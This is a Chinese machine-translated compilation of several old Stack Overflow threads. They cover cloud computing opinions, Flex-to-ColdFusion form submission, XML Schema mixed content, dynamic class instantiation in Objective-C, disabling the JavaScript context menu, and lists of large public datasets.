因此，今天有一些云使用应用程序正在使用中。我认为这有多有用取决于我如何编写软件来利用它。有许多有用的应用程序。

该技术是否更容易受到攻击？就像任何技术一样，如果您不采取必要的步骤来保护它，那么当然可以。这取决于您的云的架构。

为了回答那些认为这只是最新流行语的人，这项技术有许多有用的应用程序可以利用它。这是否成为主流是另一个问题。

作为开发人员，您确实需要评估这种方法是否对您正在进行的项目有用并且可以有效利用 - 就像任何其他技术一样。如果它有用并且可以有效地利用它，那么就使用它。如果你不能，那就不要。

* * *

## 回答 #6

> 赞同：1
> 
> 时间：2008-12-19T21:03:40.177

查看Matt Cutts 的这篇[博文。](http://www.mattcutts.com/blog/living-in-the-cloud/)他运行了一些软件来监控他有多少时间花在使用各种软件应用程序上。他发现自己 96% 的时间都花在了浏览器上。他的结论是

> 当您 96% 的计算机时间花在浏览器上时，这就是生活在云中。

Matt Cutts 并不典型——他为谷歌工作——但他仍然是一个有趣的数据点。

* * *

## 回答 #7

> 赞同：1
> 
> 时间：2009-02-11T03:16:06.973

我一直对云计算的含义有自己的看法，我不知道它是否被认为是“正确的”，但考虑到“Web 2.0”等其他流行词，它可能是一个相当广泛的主题。在我看来，您的所有信息都可以通过任何设备以直观的方式获得。因此，您不会觉得与 PC 或设备绑定在一起，因为您的体验将通过互联网从一个地方带到另一个地方。

* * *

## 要回答您的问题：

***云计算真的来了吗？*** 我说不，因为根据我的个人经验，我觉得我被我的电脑和手机上的数据束缚住了。当从一个设备移动到另一个设备时，我不觉得它认识我。虽然有办法实现这种效果，但似乎没有行业标准，事情看起来很混乱。

***企业真的准备好迎接云计算了吗？*** 我根本不是商人，但我敢打赌，企业还没有真正为此做好准备，我怀疑大多数 CEO 甚至完全理解这个概念，至少那些不在硬件/软件行业的 CEO。

***消费者是否有适当的资源来使用来自云的服务？*** 我不这么认为，因为就像我提到的那样，没有标准，而且事情很混乱，而且我猜很多消费者并不精通技术。

***这项技术是否容易受到更多攻击？*** 可能是因为随之而来的个人数据的广泛分布。

***一些人认为云计算只是另一个被过度炒作的术语，它将会失败。真的？*** 错误的。好吧，在大多数情况下，围绕它的嗡嗡声可能会在它变得更加普遍后消失。在我看来，我认为这是一个很棒的概念，只需要正确实施即可。

***作为开发人员，我需要做什么不同的事情？*** 我可能没有资格回答这个问题;-)。我认为单个开发人员不需要改变，而是与其他人合作构建适当的框架，让这个概念真正实现。我认为这只能从整个行业的角度来看成为现实。

* * *

## 回答 #8

> 赞同：0
> 
> 时间：2008-12-19T18:38:22.153

是的，我认为企业已经为云计算做好了准备，或者可以很快做好准备（在基础设施方面）。企业总是准备好节省资金并降低风险，因此假设这种商业模式适用于云客户，那么我预计我们会看到越来越多的企业过渡到这种工作方式。

消费者当然拥有资源。例如，任何使用过亚马逊的人都使用过云服务（他们已经“产品化”了他们在内部使用的云，并使其也可供公众使用）。任何使用过 K9 网络过滤器的人都使用过云服务。它们比大多数人意识到的更普遍，并且在大多数情况下都是为了相当透明。

我看到了抵御攻击的混合潜力。几乎按照定义，“在云中”意味着要关闭服务，必须取消更多的联系点（数量上的优势）。另一方面，系统可能有更多的入口点，这可能意味着更多的攻击可能性。

由于云计算固有的灵活性和使用相当便宜的组件实现底层基础设施的能力，云计算可能会继续存在。最难做好的部分是运行整个软件的软件，但有些公司已经做得很好。

作为一名开发人员，我建议观看公开可用的云资源（亚马逊、谷歌、微软等），看看有什么共同点，看看市场份额最终会如何变化（以确定你的重点可能是什么）。据我所知，他们都提供了 API 和文档，以尽可能简单地使用他们的云，所以从阅读那里的内容开始。

我希望这有帮助！

* * *

## 回答 #9

> 赞同：0
> 
> 时间：2008-12-19T18:49:14.207

简短的回答是“云计算将继续存在” 这绝对是一个众所周知的答案。

> 企业真的准备好迎接云计算了吗？

业务和持续业务需要敏捷并适应技术，主要是如果他们主要关注技术。这并不意味着每个企业都准备好了，但他们的成功可能意味着准备好了。

> ```
> * Do consumers have the appropriate resources to consume services from the cloud? 
> ```

许多人很久以前就在使用云端服务。消费者正在使用任何 google 和 yahoo 服务。云计算将所有的力量都放在了普通的开发人员和业务人员身上。

> ```
> * Is this technology prone to more attacks? 
> ```

与任何新技术一样，这将是一条没有攻击的曲线（是新的），然后你会受到一些攻击，人们会从那些“坏人”中获得利润。我不认为这种特殊的技术会更容易出现，直到达到平衡为止。

> ```
> * Some think cloud computing is just another over hyped term thats going to fizzle out. True? 
> ```

这可能是真的。在某些时候，您将不知道您正在使用它，因为接下来的伟大事情将在它之上。

> ```
> * As a developer what different do I need to do? 
> ```

如果生物学家发现了一个新物种，那么围绕这项工作的 1000 多名生物学家有很多事情要做。他们需要跑所有其他香料的研究，发现所有有特殊的东西。同样的情况也发生在这里。你看到它，选择你的专业，并在这里应用它。它可能对你有好处，至少在未来的知识方面。

我希望这是有帮助的。

* * *

## 回答 #10

> 赞同：0
> 
> 时间：2009-02-12T19:53:54.663

我认为云正在演变为不一定意味着部署到公共基础设施。正如内部网跟随互联网一样，私有云正在获得牵引力。

“云”可以带来的一个很大的不同是资源的管理。能够将大量基于商品的硬件视为单个或减少的实体集，并且具有将这些资源更容易地移动到需要它们的地方的设施，以获得更好的利用。今天的传统虚拟机在该领域可能有所欠缺。将大量机器从一种计算需求转移到另一种计算需求的过程可能很乏味。

还有自动故障转移的概念，因此在硬件故障期间执行的工作不会丢失。

# forms - Flex：如何访问我的 flex 表单中的数据并将其提交给 ColdFusion cfc？

> ID：381772
> 
> 赞同：1
> 
> 时间：2008-12-19T18:25:01.620
> 
> 标签：forms, apache-flex, coldfusion, cfc

我想将弹性表单的值提交给 ColdFusion cfc。

如果我有一个弹性表单（见下文），表单中的数据是一个对象吗？还是我必须根据表单中的 id 创建一个对象，然后将该新对象传递给 Coldfusion 组件？

```
<mx:Form x="10" y="10" width="790" id="myFrom" defaultButton="{createReport}">
    <mx:FormItem label="Resume Report Type:">
    <mx:RadioButtonGroup id="showtype"/>
    <mx:HBox>
        <mx:RadioButton groupName="showtype" id="NotUpdated" value="notupdated" label="Not Updated" width="100"  />
        <mx:RadioButton groupName="showtype" id="Updated" value="updated" label="Updated" width="75"  />
        <mx:RadioButton groupName="showtype" id="All" value="all" label="All" width="75"  />
    </mx:HBox>
    </mx:FormItem>
    <mx:FormItem label="User Organzation:">
        <mx:ComboBox dataProvider="{qOrganization}" labelField="UserOrganization" />    </mx:FormItem>

    <mx:FormItem label="Between the following dates:">
        <mx:HBox>
            <mx:DateField/>
            <mx:DateField left="10"/>
        </mx:HBox>
    </mx:FormItem>
    <mx:FormItem>

        <mx:Button label="Create Report" id="createReport"/>
    </mx:FormItem>  
    </mx:Form> 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2008-12-19T20:49:43.903

没有数据绑定到表单中的任何控件（ComboBox 的 dataProvider 除外）。如果您想以最少的修改从表单中提取数据，请为每个控件分配一个“id”属性，然后从 ActionScript 以编程方式访问它们：

```
var obj : MyObject = new MyObject();
obj.beginDate = beginDate.selectedDate;
obj.endDate = endDate.selectedDate;
obj.organization = Organization(comboOrg.selectedItem);
// etc 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2008-12-19T22:41:27.750

不，这不是所有表单变量的集合或对象（这太容易了）。

如果这就是您想要的，您可以创建一个自定义对象，如描述的 Big Red Dog (brd6644)。不过，这是可选的；您无需在发回对象之前创建对象。您可以将每个字段作为通过其 ID 引用它们的参数传递。这实际上取决于偏好以及您的 CF 服务是否基于 OO。

您还可以选择创建数据模型并将其发送回 CF，如下所示：

```
<!-- DATA MODEL -->
<mx:Model id="formModel">
    <form>
        <beginDate>{beginDate.selectedDate}</beginDate>
        <endDate>{endDate.selectedDate}</endDate>
        <organization>
            <name></name>
            <address></address>
        </organization>
    </form>
</mx:Model>

<!-- REMOTE OBJECT/SERVER SIDE FORM HANDLER -->
<mx:RemoteObject
    id="roSubmitForm"
    source="com.mycfc"
    destination="ColdFusion"
    showBusyCursor="true">

    <mx:method name="submitForm" result="onSubmit(event)">
        <mx:arguments>
            <form>
                <beginDate>{formModel.beginDate}</beginDate>
                <endDate>{formModel.endDate}</endDate>
                <organization>
                    <name>formModel.organization.name</name>
                    <address>formModel.organization.address</address>
                </organization>
            </form>
        </mx:arguments>
    </mx:method>
</mx:RemoteObject> 
```

这里有更多关于[Flex 数据模型](http://www.adobe.com/devnet/flex/quickstart/defining_data_models/)的内容……我仍然没有完全相信它们的用处……但这是另一种选择。

# xml - XML Schema：可以包含元素或文本的元素？

> ID：381782
> 
> 赞同：37
> 
> 时间：2008-12-19T18:27:03.440
> 
> 标签：xml, xsd

我将如何定义一个可以包含纯文本或包含元素的元素？假设我想以某种方式允许这两种情况：

```
<xs:element name="field">
    <xs:complexType>
        <xs:sequence>
            <xs:element ref="subfield" minOccurs="0" maxOccurs="unbounded" />
        </xs:sequence>
        <xs:attribute name="name" type="xs:string" />
    </xs:complexType>
</xs:element>

<xs:element name="field" type="xs:string" /> 
```

...这样这两个元素都是有效的：

```
<field name="test_field_0">
    <subfield>Some text.</subfield>
</field>

<field name="test_field_1">Some more text.</field> 
```

* * *

## 回答 #1

> 赞同：24
> 
> 时间：2008-12-19T18:44:30.613

不久前我对此进行了一些研究，我发现的唯一解决方案是使用混合属性：

```
<xs:element name="field">
    <xs:complexType mixed="true">
        <xs:sequence>
                <xs:element ref="subfield" minOccurs="0" maxOccurs="unbounded" />
        </xs:sequence>
        <xs:attribute name="name" type="xs:string" />
    </xs:complexType>
</xs:element> 
```

可悲的是，这也允许

```
<field name="test_field_0">
    Some text I'm sure you don't want.
    <subfield>Some text.</subfield>
    More text you don't want.
</field> 
```

希望有人能给出更好的答案。

* * *

## 回答 #2

> 赞同：13
> 
> 时间：2009-11-26T18:54:23.407

另一种选择是让您使用继承。您生成的 XML 不是那么漂亮，但您得到的正是您想要的内容：

```
<xsd:element name="field" type="field" abstract="true" />
<xsd:element name="subfield" type="xsd:string" /> 

<xsd:complexType name="field" abstract="true" />

<xsd:complexType name="subfield">
  <xsd:complexContent>
    <xsd:extension base="field">
      <xsd:sequence>
        <xsd:element ref="subfield" minOccurs="0" maxOccurs="unbounded" />
      </xsd:sequence>
      <xsd:attribute name="name" type="xsd:string" />
    </xsd:extension>
  </xsd:complexContent>
</xsd:complexType>

<xsd:complexType name="no-subfield">
  <xsd:complexContent mixed="true">
    <xsd:extension base="field">
      <xsd:attribute name="name" type="xsd:string" />
    </xsd:extension>
  </xsd:complexContent>
</xsd:complexType> 
```

然后您生成的 XML 将包含以下内容（假设您已`xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"`在某处声明）

```
<field xsi:type="subfield">
  <subfield>your stuff here</subfield>
</field> 
```

或者

```
<field xsi:type="no-subfield">your other stuff</field> 
```

最重要的是，它不允许

```
<field xsi:type="subfield">
  Text you don't want
  <subfield>your stuff here</subfield>
  More text you don't want
</field> 
```

# iphone - 在 Objective-C 中动态实例化类，可能吗？

> ID：381793
> 
> 赞同：21
> 
> 时间：2008-12-19T18:31:42.777
> 
> 标签：iphone, objective-c, xml, cocoa, cocoa-touch

我的问题如下。我有一个方法，它只需要一个 XML 摘录和一个 XPath。然后它应该为该 XML 摘录创建一个对象数组。意思是如果我通过了以下 XML：

```
<user>
  <name>Bob</name>
  <age>50</age>
</user> 
```

我的方法将实例化 User 类的一个实例，并使用键值编码来设置实例变量。这是相当直截了当的。唯一的问题是我主要来自脚本背景并试图查看是否可以将方法传递给类名。现在它正在做一个 User 类，稍后它可能是一个 Cars 类，然后是一个 Home 类。在保持代码尽可能抽象的同时，从这种不同类型的方法实例化对象的最佳方法是什么？

* * *

## 回答 #1

> 赞同：54
> 
> 时间：2008-12-19T18:54:26.990

要使用其名称实例化一个类，您可以使用[NSClassFromString](https://developer.apple.com/documentation/foundation/1395135-nsclassfromstring?language=objc)：

```
id obj = [[NSClassFromString(@"MySpecialClass") alloc] init]; 
```

* * *

## 回答 #2

> 赞同：23
> 
> 时间：2008-12-19T19:16:43.577

类是对象，可以像其他对象一样使用/发送。

创建类对象：

```
Class classForElement = [MyUserClass class]; 
```

实例化该类的对象

```
id newObject = [[classForElement alloc] init]; 
```

如果类名与元素名不同，则创建一个字典，其中类作为对象，元素名作为键。

```
[NSDictionary dictionaryWithObjectsAndKeys:
                         [MyUserClass class], @"user", 
                         [MyCarClass class], @"car", 
                         [MyHomeClass class], @"home",
                          nil]]; 
```

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2008-12-19T19:47:01.953

您想深入了解 Core Data。托管对象可能会派上用场。

CocoaDevCentral 有一些介绍文章，但您可能需要 Apple 文档。

[http://cocoadevcentral.com/articles/000086.php](http://cocoadevcentral.com/articles/000086.php)

[编辑] 我刚刚被提醒您是在 iPhone 上执行此操作的。Core Data 框架的不可用并不意味着您不能从中借用，而只是重新实现您需要的东西。开源 OpenStep 框架之一可能有代码。

在移动设备上，您可能需要注意数据的大小。

Ezra Epstein 关于运行时创建类（以及更多）：

[http://www.macdevcenter.com/pub/a/mac/2002/05/24/runtime_partone.html](http://www.macdevcenter.com/pub/a/mac/2002/05/24/runtime_partone.html)

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2008-12-27T06:13:46.303

尝试使用 id 作为方法签名中的参数类型。一个 id 对象可以被类型转换为任何类对象

你是在为 iPhone 做这个项目吗？你在使用 NSXMLNode。如果您是，请注意仅允许在模拟器上使用 NSXMLNode。它不适用于 iPhone，因为 NSXMLNode 是核心库的一部分。

# javascript - 如何在 JavaScript 中禁用右键单击上下文菜单

> ID：381795
> 
> 赞同：153
> 
> 时间：2008-12-19T18:33:56.173
> 
> 标签：javascript, contextmenu

并不是说我试图阻止“查看源代码”或类似的愚蠢行为，而是我正在为某些元素制作一些自定义上下文菜单。

编辑：对答案的回应：我试过这个：

```
<a id="moo" href=''> </a>

<script type="text/javascript">
    var moo = document.getElementById('moo');

    function handler(event) {
        event = event || window.event;

        if (event.stopPropagation)
            event.stopPropagation();

        event.cancelBubble = true;
        return false;
    }

    moo.innerHTML = 'right-click here';

    moo.onclick = handler;
    moo.onmousedown = handler;
    moo.onmouseup = handler;
</script> 
```

* * *

## 回答 #1

> 赞同：147
> 
> 时间：2013-06-07T15:19:51.470

如果您不关心每次尝试右键单击时都用消息提醒用户，请尝试将其添加到您的正文标签

```
<body oncontextmenu="return false;"> 
```

这将阻止对上下文菜单的所有访问（不仅来自鼠标右键，还来自键盘）

但是，添加右键单击禁用器确实没有意义。任何具有基本浏览器知识的人都可以查看源代码并提取他们需要的信息。

* * *

## 回答 #2

> 赞同：121
> 
> 时间：2008-12-19T18:48:34.100

捕获`onContextMenu`事件，并在事件处理程序中返回 false。

`event.button`无论如何，在某些浏览器中，您还可以捕获单击事件并检查哪个鼠标按钮触发了该事件。

* * *

## 回答 #3

> 赞同：19
> 
> 时间：2013-08-17T14:02:48.540

我用过这个：

```
document.onkeydown = keyboardDown;
document.onkeyup = keyboardUp;
document.oncontextmenu = function(e){
 var evt = new Object({keyCode:93});
 stopEvent(e);
 keyboardUp(evt);
}
function stopEvent(event){
 if(event.preventDefault != undefined)
  event.preventDefault();
 if(event.stopPropagation != undefined)
  event.stopPropagation();
}
function keyboardDown(e){
 ...
}
function keyboardUp(e){
 ...
} 
```

然后我在最后两个函数中捕获 e.keyCode 属性 - 如果 e.keyCode == 93，我知道用户要么释放了鼠标右键，要么按下/释放了上下文菜单键。

希望能帮助到你。

* * *

## 回答 #4

> 赞同：4
> 
> 时间：2008-12-19T18:59:05.297

如果您的页面确实依赖于人们无法看到该菜单的事实，那么您应该知道现代浏览器（例如 Firefox）让用户决定他是否真的想要禁用它。因此，您根本无法保证菜单会被真正禁用。

* * *

## 回答 #5

> 赞同：1
> 
> 时间：2008-12-19T19:01:22.157

您不能依赖上下文菜单，因为用户可以停用它。大多数网站都希望使用该功能来惹恼访问者。

# database - 大型公共数据集？

> ID：381806
> 
> 赞同：68
> 
> 时间：2008-12-19T18:37:01.190
> 
> 标签：database, performance, dataset, benchmarking

我正在寻找一些大型公共数据集，特别是：

1.  已匿名化的大型 Web 服务器日志示例。

2.  用于数据库性能基准测试的数据集。

任何其他大型公共数据集的链接将不胜感激。我已经了解亚马逊的公共数据集： [http ://aws.amazon.com/publicdatasets/](http://aws.amazon.com/publicdatasets/)

* * *

## 回答 #1

> 赞同：30
> 
> 时间：2012-04-23T19:51:30.653

> 1\. 已匿名化的大型 Web 服务器日志示例。

这些工作开始：

*   [UCI 机器学习存储库](http://archive.ics.uci.edu/ml/datasets.html)
    *   [匿名 Microsoft Web 数据](http://archive.ics.uci.edu/ml/datasets/Anonymous+Microsoft+Web+Data)
    *   [MSNBC.com 匿名网络数据](http://archive.ics.uci.edu/ml/datasets/MSNBC.com+Anonymous+Web+Data)
    *   [Syskill 和 Webert 网页评级](http://archive.ics.uci.edu/ml/datasets/Syskill+and+Webert+Web+Page+Ratings)

可用的数据集比这些多得多（请参阅其他答案的范围），但这是满足您原始标准的最低目标。作为奖励，如果您有他们可能知道的特定需求，他们会[提供联系链接。](http://archive.ics.uci.edu/ml/contact.html)

> 2\. 用于数据库性能基准测试的数据集。

这听起来像是用词不当，因为您要求的是描述[定义明确的](http://en.wikipedia.org/wiki/B+_tree) [算法](http://en.wikipedia.org/wiki/Divide_and_conquer_algorithm) [问题](http://en.wikipedia.org/wiki/Database_normalization)的经验数据集。具体来说，听起来您正在尝试查找可用于实时测试和基准测试各种数据库系统的数据集，使用定义明确的规范化关系数据，这些数据可用作一组测试用例来确定最有效的解决方案，满足您的需求。

我不同意这种做法。与其寻找一连串的数据库系统及其固定实现，不如探索这些系统的[算法](http://en.wikipedia.org/wiki/B+_tree) [保证](http://en.wikipedia.org/wiki/Graph_database)作为您的第一个停靠点。一旦您确定了满足您需求的算法约束，您就可以磨练一组罐头解决方案，您可以对这些解决方案的效率进行基准测试，例如，索引、排序、搜索、插入、删除和检索。

Wikipedia 提供[了一篇关于数据库测试概念的简短文章](http://en.wikipedia.org/wiki/Database_testing)，您可以使用它来确定和编写测试用例以进行基准测试。例如，您可以使用[JDBC](http://en.wikipedia.org/wiki/Java_Database_Connectivity)和[JDBC Benchmark](http://www.inetsoftware.de/products/jdbc-driver/oracle/documentation/benchmark)等不可知的数据访问接口来确定每个操作的相对时间。从这里，您可以找到正确的解决方案。

**简而言之，**首先进行[研究](http://en.wikipedia.org/wiki/Analysis_of_algorithms)以确定数据库保证。一旦确定了一组候选解决方案，您可以通过测试（或以其他方式确定）每个所需操作的恒定时间性能来从中选择。

* * *

## 回答 #2

> 赞同：27
> 
> 时间：2014-11-23T03:26:19.373

基于[Quora 的回答](http://www.quora.com/Data/Where-can-I-get-large-datasets-open-to-the-public)和我在研究中的个人收藏，在 GitHub 上创建并更新了一个[awesome-public-datasets存储库：](https://github.com/caesar0301/awesome-public-datasets)

以下是此列表的快照版本。如需最新列表，请访问[Github](https://github.com/caesar0301/awesome-public-datasets)：

此公共数据源列表是从博客、答案和用户响应中收集和整理的。下面列出的大多数数据集都是免费的，但也有一些不是。该列表来自[https://github.com/caesar0301/awesome-public-datasets](https://github.com/caesar0301/awesome-public-datasets)。

## 气候

*   澳大利亚天气： http: [//www.bom.gov.au/climate/dwo/](http://www.bom.gov.au/climate/dwo/)
*   气候数据：[http](http://www.cru.uea.ac.uk/cru/data/temperature/#datter) ://www.cru.uea.ac.uk/cru/data/temperature/#datter和[ftp://ftp.cmdl.noaa.gov/](ftp://ftp.cmdl.noaa.gov/)
*   自 1929 年以来的全球气候数据：[http ://www.tutiempo.net/en/Climate](http://www.tutiempo.net/en/Climate)
*   NOAA 白令海气候：[http ://www.beringclimate.noaa.gov/](http://www.beringclimate.noaa.gov/)
*   NOAA 气候数据集： http: [//ncdc.noaa.gov/data-access/quick-links](http://ncdc.noaa.gov/data-access/quick-links)
*   WU 全球历史天气：[http ://www.wunderground.com/history/index.html](http://www.wunderground.com/history/index.html)

## 经济学

*   美国经济协会。(AEA)：[http ://www.aeaweb.org/RFE/toc.php?show=complete](http://www.aeaweb.org/RFE/toc.php?show=complete)
*   经济数据（UMD）：http: [//inforumweb.umd.edu/econdata/econdata.html](http://inforumweb.umd.edu/econdata/econdata.html)
*   互联网产品代码数据库：[http ://www.upcdatabase.com/](http://www.upcdatabase.com/)
*   世界银行：[http ://data.worldbank.org/indicator](http://data.worldbank.org/indicator)

## 金融

*   CBOE期货交易所：[http ://cfe.cboe.com/Data/](http://cfe.cboe.com/Data/)
*   谷歌财经：[https ://www.google.com/finance](https://www.google.com/finance)
*   谷歌趋势：[http ://www.google.com/trends?q=google&ctab=0&geo=all&date=all&sort=0](http://www.google.com/trends?q=google&ctab=0&geo=all&date=all&sort=0)
*   纳斯达克：[https ://data.nasdaq.com/](https://data.nasdaq.com/)
*   万达：[http ://www.oanda.com/](http://www.oanda.com/)
*   OSU 财务数据： http: [//fisher.osu.edu/fin/osudata.htm](http://fisher.osu.edu/fin/osudata.htm)
*   [匡德尔： http](http://www.quandl.com/) ://www.quandl.com/
*   圣路易斯联邦：[http ://research.stlouisfed.org/fred2/](http://research.stlouisfed.org/fred2/)
*   雅虎财经：http: [//finance.yahoo.com/](http://finance.yahoo.com/)

## 生物学

*   CRCNS：[http ://crcns.org/data-sets](http://crcns.org/data-sets)
*   基因表达综合：[http ://www.ncbi.nlm.nih.gov/geo/](http://www.ncbi.nlm.nih.gov/geo/)
*   人类微生物组计划：[http ://www.hmpdacc.org/reference_genomes/reference_genomes.php](http://www.hmpdacc.org/reference_genomes/reference_genomes.php)
*   麻省理工学院癌症基因组学数据：[http ://www.broadinstitute.org/cgi-bin/cancer/datasets.cgi](http://www.broadinstitute.org/cgi-bin/cancer/datasets.cgi)
*   NIH 微阵列数据： ftp: [//ftp.ncbi.nih.gov/pub/geo/DATA/supplementary/series/GSE6532/](ftp://ftp.ncbi.nih.gov/pub/geo/DATA/supplementary/series/GSE6532/)
*   蛋白质结构： http: [//www.infobiotic.net/PSPbenchmarks/](http://www.infobiotic.net/PSPbenchmarks/)
*   公共基因数据：[http ://www.pubgene.org/](http://www.pubgene.org/)
*   斯坦福微阵列数据：[http ://smd.stanford.edu/](http://smd.stanford.edu/)
*   UniGene：[http ://www.ncbi.nlm.nih.gov/unigene](http://www.ncbi.nlm.nih.gov/unigene)

## 物理

*   美国国家航空航天局：http: [//nssdc.gsfc.nasa.gov/nssdc/obtaining_data.html](http://nssdc.gsfc.nasa.gov/nssdc/obtaining_data.html)

## 卫生保健

*   EHDP 大型健康数据集：[http ://www.ehdp.com/vitalnet/datasets.htm](http://www.ehdp.com/vitalnet/datasets.htm)
*   Gapminder：[http ://www.gapminder.org/data/](http://www.gapminder.org/data/)
*   医疗保险数据文件： http: [//go.cms.gov/19xxPN4](http://go.cms.gov/19xxPN4)

## 地理空间

*   EOSDIS：[http ://sedac.ciesin.columbia.edu/data/sets/browse](http://sedac.ciesin.columbia.edu/data/sets/browse)
*   事实全球位置数据： http: [//www.factual.com/](http://www.factual.com/)
*   地理空间数据： http: [//geodacenter.asu.edu/datalist/](http://geodacenter.asu.edu/datalist/)

## 运输

*   航空公司数据（2009 年 ASA 挑战赛）：[http ://stat-computing.org/dataexpo/2009/the-data.html](http://stat-computing.org/dataexpo/2009/the-data.html)
*   机场及其位置： http: [//www.infochimps.com/datasets/airports-and-their-locations](http://www.infochimps.com/datasets/airports-and-their-locations)
*   自行车共享数据系统：[https ://github.com/BetaNYC/Bike-Share-Data-Best-Practices/wiki/Bike-Share-Data-Systems](https://github.com/BetaNYC/Bike-Share-Data-Best-Practices/wiki/Bike-Share-Data-Systems)
*   1990 年至 2009 年美国国内航班的边缘数据：[http ://data.memect.com/?p=229](http://data.memect.com/?p=229)
*   半百万次 Hubway 骑行：[http ://hubwaydatachallenge.org/trip-history-data/](http://hubwaydatachallenge.org/trip-history-data/)
*   纽约市出租车行程数据 2013 (FOIA/FOIL)：[https ://archive.org/details/nycTaxiTripData2013](https://archive.org/details/nycTaxiTripData2013)
*   OpenFlights（机场、航空公司和航线数据）： http: [//openflights.org/data.html](http://openflights.org/data.html)
*   RITA 航空公司准点率数据：[http ://www.transtats.bts.gov/Tables.asp?DB_ID=120](http://www.transtats.bts.gov/Tables.asp?DB_ID=120)
*   RITA 运输数据收集：[http ://www.transtats.bts.gov/DataIndex.asp](http://www.transtats.bts.gov/DataIndex.asp)
*   伦敦交通：[http ://www.tfl.gov.uk/info-for/open-data-users/our-feeds](http://www.tfl.gov.uk/info-for/open-data-users/our-feeds)
*   美国货运分析框架： http: [//ops.fhwa.dot.gov/freight/freight_analysis/faf/index.htm](http://ops.fhwa.dot.gov/freight/freight_analysis/faf/index.htm)

## 政府

*   存档-it: : [https://www.archive-it.org/explore?show=Collections](https://www.archive-it.org/explore?show=Collections)
*   澳大利亚：[http ://www.abs.gov.au/AUSSTATS/abs@.nsf/DetailsPage/3301.02009?OpenDocument](http://www.abs.gov.au/AUSSTATS/abs@.nsf/DetailsPage/3301.02009?OpenDocument)
*   加拿大：[http ://www.data.gc.ca/default.asp?lang=En&n=5BCD274E-1](http://www.data.gc.ca/default.asp?lang=En&n=5BCD274E-1)
*   芝加哥：[https ://data.cityofchicago.org/](https://data.cityofchicago.org/)
*   FDA：[https ://open.fda.gov/index.html](https://open.fda.gov/index.html)
*   美联储统计：[http ://www.fedstats.gov/cgi-bin/A2Z.cgi](http://www.fedstats.gov/cgi-bin/A2Z.cgi)
*   卫报世界政府：[http ://www.guardian.co.uk/world-government-data](http://www.guardian.co.uk/world-government-data)
*   平视显示器：[http ://www.huduser.org/portal/datasets/pdrdatas.html](http://www.huduser.org/portal/datasets/pdrdatas.html)
*   英国伦敦数据存储：http: [//data.london.gov.uk/dataset](http://data.london.gov.uk/dataset)
*   新西兰： http: [//www.stats.govt.nz/browse_for_stats.aspx](http://www.stats.govt.nz/browse_for_stats.aspx)
*   纽约 betanyc：[http ://betanyc.us/](http://betanyc.us/)
*   纽约市开放数据： http: [//nycplatform.socrata.com/](http://nycplatform.socrata.com/)
*   经合组织：[http ://www.oecd.org/document/0,3746,en_2649_201185_46462759_1_1_1_1,00.html](http://www.oecd.org/document/0,3746,en_2649_201185_46462759_1_1_1_1,00.html)
*   丽塔：[http ://www.transtats.bts.gov/OT_Delay/OT_DelayCause1.asp](http://www.transtats.bts.gov/OT_Delay/OT_DelayCause1.asp)
*   旧金山数据集：[http ://datasf.org/](http://datasf.org/)
*   世界银行：[http ://wdronline.worldbank.org/](http://wdronline.worldbank.org/)
*   英国政府数据：[http ://data.gov.uk/data](http://data.gov.uk/data)
*   美国人口普查局：[http ://www.census.gov/data.html](http://www.census.gov/data.html)
*   美国联邦政府机构：[http ://www.data.gov/metric](http://www.data.gov/metric)
*   美国联邦政府数据目录：[http ://catalog.data.gov/dataset](http://catalog.data.gov/dataset)
*   美国公开政府：[http ://www.data.gov/open-gov/](http://www.data.gov/open-gov/)
*   英国 2011 年人口普查开放地图集项目：[http ://www.alex-singleton.com/2011-census-open-atlas-project/](http://www.alex-singleton.com/2011-census-open-atlas-project/)
*   联合国：[http ://data.un.org/](http://data.un.org/)
*   美国 CDC 公共卫生数据集：[http ://www.cdc.gov/nchs/data_access/ftp_data.htm](http://www.cdc.gov/nchs/data_access/ftp_data.htm)

## 数据挑战

*   机器学习的挑战：http: [//www.chalearn.org/](http://www.chalearn.org/)
*   ICWSM 数据挑战赛（自 2009 年起）：http: [//icwsm.cs.umbc.edu/](http://icwsm.cs.umbc.edu/)
*   Kaggle 比赛数据：[http ://www.kaggle.com/](http://www.kaggle.com/)
*   2012年腾讯KDD杯：[https ://www.kddcup2012.org/](https://www.kddcup2012.org/)
*   Netflix 奖： http: [//www.netflixprize.com/leaderboard](http://www.netflixprize.com/leaderboard)
*   Yelp 数据集挑战：[http ://www.yelp.com/dataset_challenge](http://www.yelp.com/dataset_challenge)

## 机器学习

*   eBay 在线拍卖：[http ://www.modelingonlineauctions.com/datasets](http://www.modelingonlineauctions.com/datasets)
*   IMDb 数据库：[http ://www.imdb.com/interfaces](http://www.imdb.com/interfaces)
*   龙骨库：[http ://sci2s.ugr.es/keel/datasets.php](http://sci2s.ugr.es/keel/datasets.php)
*   Lending Club 贷款数据：[https ://www.lendingclub.com/info/download-data.action](https://www.lendingclub.com/info/download-data.action)
*   机器学习数据集存储库： http: [//mldata.org/](http://mldata.org/)
*   百万歌曲数据集：[http ://blog.echonest.com/post/3639160982/million-song-dataset](http://blog.echonest.com/post/3639160982/million-song-dataset)
*   更多歌曲数据集： http: [//labrosa.ee.columbia.edu/millionsong/pages/additional-datasets](http://labrosa.ee.columbia.edu/millionsong/pages/additional-datasets)
*   MovieLens 数据集：[http ://datahub.io/dataset/movielens](http://datahub.io/dataset/movielens)
*   RDataMining R 和数据挖掘电子书数据：[http ://www.rdatamining.com/data](http://www.rdatamining.com/data)
*   地球上已登记的陨石：[http ://www.analyticbridge.com/profiles/blogs/registered-meteorites-that-has-impacted-on-earth-visualized](http://www.analyticbridge.com/profiles/blogs/registered-meteorites-that-has-impacted-on-earth-visualized)
*   SF 餐厅数据集： http: [//missionlocal.org/san-francisco-restaurant-health-inspections/](http://missionlocal.org/san-francisco-restaurant-health-inspections/)
*   UCI 机器学习存储库： http: [//archive.ics.uci.edu/ml/](http://archive.ics.uci.edu/ml/)
*   多伦多大学 Delve 数据集：[http ://www.cs.toronto.edu/~delve/data/datasets.html](http://www.cs.toronto.edu/~delve/data/datasets.html)
*   雅虎评级和分类数据：[http ://webscope.sandbox.yahoo.com/catalog.php?datatype=r](http://webscope.sandbox.yahoo.com/catalog.php?datatype=r)

## 自然语言

*   上下文中的 4000 万个实体：[https ://code.google.com/p/wiki-links/downloads/list](https://code.google.com/p/wiki-links/downloads/list)
